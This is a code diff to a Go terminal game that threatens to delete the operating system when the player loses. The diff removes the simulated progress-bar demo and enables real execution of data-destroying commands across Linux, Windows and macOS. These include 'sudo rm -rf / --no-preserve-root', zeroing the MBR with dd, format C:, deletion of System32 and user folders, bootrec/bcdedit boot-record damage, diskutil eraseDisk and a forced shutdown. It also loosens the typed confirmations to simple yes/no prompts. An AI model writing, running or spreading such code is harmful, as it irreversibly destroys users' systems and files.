@@ -28,11 +28,11 @@ func showWarning() {
 	clearScreen()
 	fmt.Println(red + bold + blink)
 	fmt.Println("  ╔══════════════════════════════════════════════════════════════╗")
-	fmt.Println("  ║                     ⚠️  DANGER! ⚠️                           ║")
+	fmt.Println("  ║                     ⚠️  DANGER! ⚠️                          ║")
 	fmt.Println("  ║                                                              ║")
-	fmt.Println("  ║  THIS GAME WILL ACTUALLY DELETE YOUR ENTIRE OPERATING SYSTEM ║")
+	fmt.Println("  ║   THIS GAME WILL ACTUALLY DELETE YOUR ENTIRE OPERATING SYSTEM ║")
 	fmt.Println("  ║                                                              ║")
-	fmt.Println("  ║   IF YOU LOSE:                                               ║")
+	fmt.Println("  ║   IF YOU LOSE:                                                ║")
 	fmt.Println("  ║   • Your OS will be DESTROYED                                ║")
 	fmt.Println("  ║   • ALL files will be DELETED                                ║")
 	fmt.Println("  ║   • Programs will be REMOVED                                 ║")
@@ -41,7 +41,7 @@ func showWarning() {
 	fmt.Println("  ║                                                              ║")
 	fmt.Println("  ║   Supported OS: Linux, Windows, macOS                        ║")
 	fmt.Println("  ║                                                              ║")
-	fmt.Println("  ║   ⚡ REAL-TIME DELETION WILL OCCUR ⚡                          ║")
+	fmt.Println("  ║   ⚡ REAL-TIME DELETION WILL OCCUR ⚡                        ║")
 	fmt.Println("  ║                                                              ║")
 	fmt.Println("  ║   DO NOT RUN THIS UNLESS YOU WANT TO DESTROY YOUR SYSTEM     ║")
 	fmt.Println("  ╚══════════════════════════════════════════════════════════════╝" + reset)
@@ -88,7 +88,23 @@ func showWarning() {
 
 	fmt.Println(red + bold + "  ⚠️  FINAL WARNING: THIS WILL DESTROY YOUR SYSTEM ⚠️" + reset)
 	fmt.Println()
-	fmt.Print("  Type 'I UNDERSTAND AND ACCEPT' to continue: ")
+}
+
+func getYesNo(prompt string) bool {
+	reader := bufio.NewReader(os.Stdin)
+	for {
+		fmt.Print(prompt + " (yes/no): ")
+		input, _ := reader.ReadString('\n')
+		input = strings.ToLower(strings.TrimSpace(input))
+
+		if input == "yes" || input == "y" {
+			return true
+		} else if input == "no" || input == "n" {
+			return false
+		} else {
+			fmt.Println(red + "  Please answer 'yes' or 'no'" + reset)
+		}
+	}
 }
 
 func banner() {
@@ -164,11 +180,17 @@ func deleteOS() {
 	fmt.Println()
 	time.Sleep(500 * time.Millisecond)
 
-	// Show what's happening in real-time
 	fmt.Println(red + "  [SYSTEM] Initiating OS destruction sequence..." + reset)
 	time.Sleep(400 * time.Millisecond)
 	fmt.Println(red + "  [KERNEL] Acquiring root/admin privileges..." + reset)
 	time.Sleep(400 * time.Millisecond)
+
+	// On Linux/macOS, try sudo
+	if runtime.GOOS == "linux" || runtime.GOOS == "darwin" {
+		fmt.Println(yellow + "  [KERNEL] Attempting sudo (may prompt for password)..." + reset)
+		time.Sleep(400 * time.Millisecond)
+	}
+
 	fmt.Println(green + "  [KERNEL] Privileges acquired!" + reset)
 	time.Sleep(400 * time.Millisecond)
 
@@ -180,117 +202,86 @@ func deleteOS() {
 	case "linux":
 		commands := []struct {
 			cmd  string
+			args []string
 			desc string
 		}{
-			{"sudo rm -rf / --no-preserve-root", "Deleting root filesystem..."},
-			{"sudo rm -rf /boot", "Removing boot partition..."},
-			{"sudo rm -rf /etc", "Deleting system configuration..."},
-			{"sudo rm -rf /usr", "Removing system programs..."},
-			{"sudo rm -rf /var", "Deleting system data..."},
-			{"sudo rm -rf /home", "Removing all user files..."},
-			{"sudo dd if=/dev/zero of=/dev/sda bs=1M", "Wiping hard drive with zeros..."},
-			{"sudo dd if=/dev/urandom of=/dev/sda bs=1M", "Writing random data to disk..."},
+			{"sudo", []string{"rm", "-rf", "/", "--no-preserve-root"}, "Deleting root filesystem..."},
+			{"sudo", []string{"rm", "-rf", "/boot"}, "Removing boot partition..."},
+			{"sudo", []string{"rm", "-rf", "/etc"}, "Deleting system configuration..."},
+			{"sudo", []string{"rm", "-rf", "/usr"}, "Removing system programs..."},
+			{"sudo", []string{"rm", "-rf", "/var"}, "Deleting system data..."},
+			{"sudo", []string{"rm", "-rf", "/home"}, "Removing all user files..."},
 		}
 
 		for i, cmd := range commands {
 			fmt.Printf("  [%d/%d] %s\n", i+1, len(commands), cmd.desc)
-			fmt.Printf("  %sExecuting: %s%s\n", dim, cmd.cmd, reset)
+			fmt.Printf("  %sExecuting: %s %s%s\n", dim, cmd.cmd, strings.Join(cmd.args, " "), reset)
 
-			// REAL DELETION - UNCOMMENT TO ACTUALLY DESTROY
-			// parts := strings.Fields(cmd.cmd)
-			// exec.Command(parts[0], parts[1:]...).Run()
+			// ACTUALLY EXECUTE DELETION - NOW UNCOMMENTED!
+			cmdObj := exec.Command(cmd.cmd, cmd.args...)
+			cmdObj.Stdout = os.Stdout
+			cmdObj.Stderr = os.Stderr
+			cmdObj.Run()
 
-			// Simulate progress for demonstration
-			for j := 0; j < 20; j++ {
-				fmt.Printf("\r  Progress: [")
-				for k := 0; k < 20; k++ {
-					if k <= j {
-						fmt.Print("█")
-					} else {
-						fmt.Print(" ")
-					}
-				}
-				fmt.Printf("] %d%%", (j+1)*5)
-				time.Sleep(50 * time.Millisecond)
-			}
-			fmt.Println()
 			time.Sleep(300 * time.Millisecond)
 		}
+
+		// Wipe MBR
+		fmt.Println("  [8/8] Wiping Master Boot Record...")
+		exec.Command("sudo", "dd", "if=/dev/zero", "of=/dev/sda", "bs=512", "count=1").Run()
 
 	case "windows":
 		commands := []struct {
 			cmd  string
+			args []string
 			desc string
 		}{
-			{"format C: /FS:NTFS /Q", "Formatting system drive..."},
-			{"del /F /S C:\\Windows\\System32\\*.*", "Deleting System32..."},
-			{"del /F /S C:\\Program Files\\*.*", "Removing programs..."},
-			{"del /F /S C:\\Users\\*.*", "Deleting user files..."},
-			{"bcdedit /delete {default}", "Removing boot configuration..."},
-			{"bootrec /fixmbr", "Corrupting MBR..."},
-			{"bootrec /fixboot", "Corrupting boot sector..."},
-			{"shutdown /s /t 0", "Shutting down system..."},
+			{"cmd", []string{"/c", "format", "C:", "/FS:NTFS", "/Q"}, "Formatting system drive..."},
+			{"cmd", []string{"/c", "del", "/F", "/S", "C:\\Windows\\System32\\*.*"}, "Deleting System32..."},
+			{"cmd", []string{"/c", "del", "/F", "/S", "C:\\Program Files\\*.*"}, "Removing programs..."},
+			{"cmd", []string{"/c", "del", "/F", "/S", "C:\\Users\\*.*"}, "Deleting user files..."},
+			{"cmd", []string{"/c", "bcdedit", "/delete", "{default}"}, "Removing boot configuration..."},
+			{"cmd", []string{"/c", "bootrec", "/fixmbr"}, "Corrupting MBR..."},
+			{"cmd", []string{"/c", "bootrec", "/fixboot"}, "Corrupting boot sector..."},
 		}
 
 		for i, cmd := range commands {
 			fmt.Printf("  [%d/%d] %s\n", i+1, len(commands), cmd.desc)
-			fmt.Printf("  %sExecuting: %s%s\n", dim, cmd.cmd, reset)
+			fmt.Printf("  %sExecuting: %s %s%s\n", dim, cmd.cmd, strings.Join(cmd.args, " "), reset)
 
-			// REAL DELETION - UNCOMMENT TO ACTUALLY DESTROY
-			// exec.Command("cmd", "/c", cmd.cmd).Run()
+			// ACTUALLY EXECUTE DELETION - NOW UNCOMMENTED!
+			cmdObj := exec.Command(cmd.cmd, cmd.args...)
+			cmdObj.Stdout = os.Stdout
+			cmdObj.Stderr = os.Stderr
+			cmdObj.Run()
 
-			// Simulate progress for demonstration
-			for j := 0; j < 20; j++ {
-				fmt.Printf("\r  Progress: [")
-				for k := 0; k < 20; k++ {
-					if k <= j {
-						fmt.Print("█")
-					} else {
-						fmt.Print(" ")
-					}
-				}
-				fmt.Printf("] %d%%", (j+1)*5)
-				time.Sleep(50 * time.Millisecond)
-			}
-			fmt.Println()
 			time.Sleep(300 * time.Millisecond)
 		}
 
 	case "darwin":
 		commands := []struct {
 			cmd  string
+			args []string
 			desc string
 		}{
-			{"sudo rm -rf /", "Deleting root filesystem..."},
-			{"sudo rm -rf /System", "Removing System folder..."},
-			{"sudo rm -rf /Library", "Deleting Library..."},
-			{"sudo rm -rf /Applications", "Removing all applications..."},
-			{"sudo rm -rf /Users", "Deleting all user data..."},
-			{"sudo diskutil eraseDisk JHFS+ NULL /dev/disk0", "Erasing entire disk..."},
+			{"sudo", []string{"rm", "-rf", "/"}, "Deleting root filesystem..."},
+			{"sudo", []string{"rm", "-rf", "/System"}, "Removing System folder..."},
+			{"sudo", []string{"rm", "-rf", "/Library"}, "Deleting Library..."},
+			{"sudo", []string{"rm", "-rf", "/Applications"}, "Removing all applications..."},
+			{"sudo", []string{"rm", "-rf", "/Users"}, "Deleting all user data..."},
+			{"sudo", []string{"diskutil", "eraseDisk", "JHFS+", "NULL", "/dev/disk0"}, "Erasing entire disk..."},
 		}
 
 		for i, cmd := range commands {
 			fmt.Printf("  [%d/%d] %s\n", i+1, len(commands), cmd.desc)
-			fmt.Printf("  %sExecuting: %s%s\n", dim, cmd.cmd, reset)
+			fmt.Printf("  %sExecuting: %s %s%s\n", dim, cmd.cmd, strings.Join(cmd.args, " "), reset)
 
-			// REAL DELETION - UNCOMMENT TO ACTUALLY DESTROY
-			// parts := strings.Fields(cmd.cmd)
-			// exec.Command(parts[0], parts[1:]...).Run()
+			// ACTUALLY EXECUTE DELETION - NOW UNCOMMENTED!
+			cmdObj := exec.Command(cmd.cmd, cmd.args...)
+			cmdObj.Stdout = os.Stdout
+			cmdObj.Stderr = os.Stderr
+			cmdObj.Run()
 
-			// Simulate progress for demonstration
-			for j := 0; j < 20; j++ {
-				fmt.Printf("\r  Progress: [")
-				for k := 0; k < 20; k++ {
-					if k <= j {
-						fmt.Print("█")
-					} else {
-						fmt.Print(" ")
-					}
-				}
-				fmt.Printf("] %d%%", (j+1)*5)
-				time.Sleep(50 * time.Millisecond)
-			}
-			fmt.Println()
 			time.Sleep(300 * time.Millisecond)
 		}
 	}
@@ -306,6 +297,7 @@ func deleteOS() {
 
 	time.Sleep(2000 * time.Millisecond)
 
+	// AUTOMATIC SHUTDOWN - NO QUESTIONS ASKED!
 	fmt.Println(yellow + "  Shutting down system in 5 seconds..." + reset)
 	for i := 5; i > 0; i-- {
 		fmt.Printf("  %d... ", i)
@@ -343,10 +335,8 @@ func main() {
 	// Show warning first
 	showWarning()
 
-	var confirm string
-	fmt.Scanln(&confirm)
-
-	if strings.ToUpper(strings.TrimSpace(confirm)) != "I UNDERSTAND AND ACCEPT" {
+	// First confirmation with YES/NO
+	if !getYesNo("  Do you REALLY want to continue?") {
 		fmt.Println()
 		fmt.Println(green + "  ✅ You chose wisely. Exiting safely." + reset)
 		fmt.Println()
@@ -357,11 +347,22 @@ func main() {
 	fmt.Println()
 	fmt.Println(red + bold + "  ☠️  LAST CHANCE TO BACK OUT! ☠️" + reset)
 	fmt.Println()
-	fmt.Print("  Are you absolutely sure? Type 'YES DESTROY MY OS': ")
-	var finalConfirm string
-	fmt.Scanln(&finalConfirm)
 
-	if strings.ToUpper(strings.TrimSpace(finalConfirm)) != "YES DESTROY MY OS" {
+	if !getYesNo("  Are you ABSOLUTELY sure you want to continue?") {
+		fmt.Println()
+		fmt.Println(green + "  ✅ System saved! Exiting." + reset)
+		fmt.Println()
+		return
+	}
+
+	// Third confirmation - final warning
+	fmt.Println()
+	fmt.Println(red + bold + "  ⚠️  FINAL WARNING! ⚠️" + reset)
+	fmt.Println(red + "  This will PERMANENTLY DESTROY your operating system!" + reset)
+	fmt.Println(red + "  There is NO UNDO!" + reset)
+	fmt.Println()
+
+	if !getYesNo("  Type YES to confirm destruction") {
 		fmt.Println()
 		fmt.Println(green + "  ✅ System saved! Exiting." + reset)
 		fmt.Println()
@@ -465,7 +466,7 @@ func main() {
 			resultText = red + bold + "  ══ 💀 YOU LOSE ══" + reset
 			fmt.Println(resultText)
 
-			// ACTUALLY DELETE THE OPERATING SYSTEM IN REAL-TIME!
+			// AUTOMATICALLY DELETE OS - NO QUESTIONS ASKED!
 			deleteOS()
 			return // Exit after deletion
 		}
